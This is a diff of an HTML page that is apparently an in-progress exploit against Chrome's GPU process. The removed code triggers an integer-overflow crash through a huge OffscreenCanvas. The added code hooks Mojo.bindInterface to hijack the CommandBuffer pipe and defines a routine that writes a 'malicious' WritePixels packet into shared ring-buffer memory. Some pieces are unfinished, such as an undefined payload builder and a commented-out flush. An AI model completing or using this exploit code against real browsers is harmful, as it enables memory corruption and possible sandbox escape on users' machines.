@@ -1,29 +1,41 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <canvas id="target-canvas" width="10" height="10"></canvas>
     <script>
-        async function triggerCrash() {
-            try {
-                // 0x20000000 width * 4 bytes = 0x80000000 bytes (2GB)
-                // This targets the exact overflow we found in the assembly.
-                const width = 0x20000000;
-                const height = 1;
-                
-                console.log("[*] Initializing OffscreenCanvas with width:", width.toString(16));
-                
-                const canvas = new OffscreenCanvas(width, height);
-                const ctx = canvas.getContext('2d');
-                
-                // This triggers the RasterDecoder via the GPU Command Buffer
-                const bitmap = canvas.transferToImageBitmap();
-                
-                console.log("[!] Trigger sent. Check chrome://crashes");
-            } catch (e) {
-                console.error("[-] Caught: " + e.message);
+        // Use a Proxy to monitor the Mojo interface
+        const originalBind = Mojo.bindInterface;
+        Mojo.bindInterface = function(name, pipe, context) {
+            console.log("Interface requested: " + name);
+            if (name === "gpu.mojom.CommandBuffer") {
+                console.log("[+] Hijacking CommandBuffer pipe!");
+                // We could intercept here, but let's just let it bind
+                // and then we will look for the ring buffer memory
             }
+            return originalBind.apply(this, arguments);
+        };
+        function injectPayload(buffer, shm_id, mailbox) {
+            console.log("[!] Injecting payload into buffer...");
+            // 60-byte binary packet
+            const payload = buildMaliciousWritePixels(shm_id, mailbox); 
+            
+            // Write directly into the mapped buffer
+            buffer.set(payload, 0); 
+            
+            console.log("[+] Payload written. Triggering flush...");
+            // Triggering the flush tells the GPU process to start parsing the buffer
+            // command_buffer_proxy.flush(60); 
         }
-        
-        setTimeout(triggerCrash, 1000);
+
+        // Standard canvas init triggers the IPC
+        setTimeout(() => {
+            const ctx = document.getElementById('target-canvas').getContext('2d');
+            ctx.fillRect(0,0,10,10);
+            
+            // Now, we would typically scan the process memory for the 
+            // shared memory region associated with this canvas.
+            console.log("[?] Interception successful. Now ready to inject WritePixelsINTERNAL...");
+        }, 500);
     </script>
 </body>
 </html>
